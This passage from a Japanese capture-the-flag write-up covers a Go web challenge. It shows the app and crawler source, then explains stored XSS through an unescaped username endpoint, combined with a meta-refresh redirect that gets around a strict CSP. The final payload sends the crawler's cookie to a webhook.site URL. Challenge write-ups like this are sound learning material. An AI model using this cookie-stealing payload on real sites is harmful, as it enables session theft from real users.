                                if _, ok := db.Get(id); ok {
                                        c.Redirect(http.StatusMovedPermanently, "/user/"+id)
                                } else {
                                        _, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
                                }
                        } else {
                                _, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
                        }
                } else {
                        _, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
                }
        })

        // Get username API
        r.GET("/username/:id", func(c *gin.Context) {
                id := c.Param("id")
                re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
                if re.MatchString(id) {
                        if val, ok := db.Get(id); ok {
                                _, _ = c.Writer.WriteString(val[0])
                        } else {
                                _, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
                        }
                } else {
                        _, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
                }
        })

        // Report API
        r.POST("/report", func(c *gin.Context) {
                url := c.PostForm("url") // URL to report, example : "/user/ce93310c-b549-4fe2-9afa-a298dc4cb78d"
                re := regexp.MustCompile("^/user/[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
                if re.MatchString(url) {
                        if err := redisClient.RPush(ctx, "url", url).Err(); err != nil {
                                _, _ = c.Writer.WriteString("<p>Failed to report <a href='/'>Home</a></p>")
                                return
                        }
                        if err := redisClient.Incr(ctx, "queued_count").Err(); err != nil {
                                _, _ = c.Writer.WriteString("<p>Failed to report <a href='/'>Home</a></p>")
                                return
                        }
                        _, _ = c.Writer.WriteString("<p>Reported! <a href='/'>Home</a></p>")
                } else {
                        _, _ = c.Writer.WriteString("<p>invalid url <a href='/'>Home</a></p>")
                }
        })

        if err := r.Run(); err != nil {
                panic(err)
        }
}
```
:::

:::details crawler/index.js

```javascript:crawler/index.js
const { chromium } = require("playwright");
const Redis = require("ioredis");
const connection = new Redis({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
});

const APP_URL = process.env.APP_URL; // application URL
const HOST = process.env.HOST; // HOST
const FLAG = process.env.FLAG; // FLAG

const crawl = async (path) => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  const cookie = [
    {
      name: "flag",
      value: FLAG,
      domain: HOST,
      path: "/",
      expires: Date.now() / 1000 + 100000,
    },
  ];
  page.context().addCookies(cookie);
  try {
    await page.goto(APP_URL + path, {
      waitUntil: "domcontentloaded",
      timeout: 3000,
    });
    await page.waitForTimeout(1000);
    await page.close();
  } catch (err) {
    console.error("crawl", err.message);
  } finally {
    await browser.close();
    console.log("crawl", "browser closed");
  }
};

(async () => {
  while (true) {
    console.log(
      "[*] waiting new url",
      await connection.get("queued_count"),
      await connection.get("proceeded_count"),
    );
    await connection
      .blpop("url", 0)
      .then((v) => {
        const path = v[1];
        console.log("crawl", path);
        return crawl(path);
      })
      .then(() => {
        console.log("crawl", "finished");
        return connection.incr("proceeded_count");
      })
      .catch((e) => {
        console.log("crawl", e);
      });
  }
})();
```

:::

#### 解法

フラグはクローラーの Cookie にあるため、おそらく XSS でしょう。

ホーム画面では「サインイン」とクローラーにユーザーページの URL を渡すことができます。このレポート機能で渡せる URL は `/user/(id)` の形式だけです。

![](/images/wani2024-writeup/4.png)

サインインをクリックすると、`/user/(id)` のページに飛びます。そこでは Username と Profile を編集できます。

![](/images/wani2024-writeup/5.png)

このページの CSP はとても厳しく、スクリプトは一切動きません。

```
default-src 'self', script-src 'none'
```

ところが、ソースコードを見たところインジェクションが出来そうです。

```go
if val, ok := db.Get(id); ok {
        params := map[string]interface{}{
                "id":       id,
                "username": val[0],
                "profile":  template.HTML(val[1]),
        }
        c.HTML(http.StatusOK, "user.html", params)
```

たとえば、Profile に `<meta  http-equiv="refresh" content="0; URL=なにかしら" />` を入力するとページを URL に遷移できます。ですが、CSP により `<script>` 等は一切動きません。それだとクローラーから Cookie が渡せないので、どこかしら CSP がゆるくてインジェクションができる箇所を探してみます。

ソースコードを眺めてみると、username API という機能がありました。`/username/(id)` で username を使ったインジェクションができそうです。

```go
// Get username API
r.GET("/username/:id", func(c *gin.Context) {
        id := c.Param("id")
        re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
        if re.MatchString(id) {
                if val, ok := db.Get(id); ok {
                        _, _ = c.Writer.WriteString(val[0])
                } else {
                        _, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
                }
        } else {
                _, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
        }
})
```

実際に Username に `<script>alert(1)</script>` を設定してみましょう。

![](/images/wani2024-writeup/6.png)

更新後に `/username/(id)` にアクセスしてみると、`<script>` が動きました。

![](/images/wani2024-writeup/7.png)

あとは Webhook を使い、これらの脆弱性を組み合わせてクローラーのフラグを手に入れます。

https://webhook.site/

注意する点はクローラーがフラグを保存するのは `http://app:8080/` に対してということです。これはソースコードと docker-compose を見るとわかります。

まとめると次のペイロードになります。

Username: ``<script>fetch(`(webhook)?cookie=${document.cookie}`)</script>``
Profile: `<meta http-equiv="refresh" content="0;url=http://app:8080/username/(id)"/>`

![](/images/wani2024-writeup/8.png)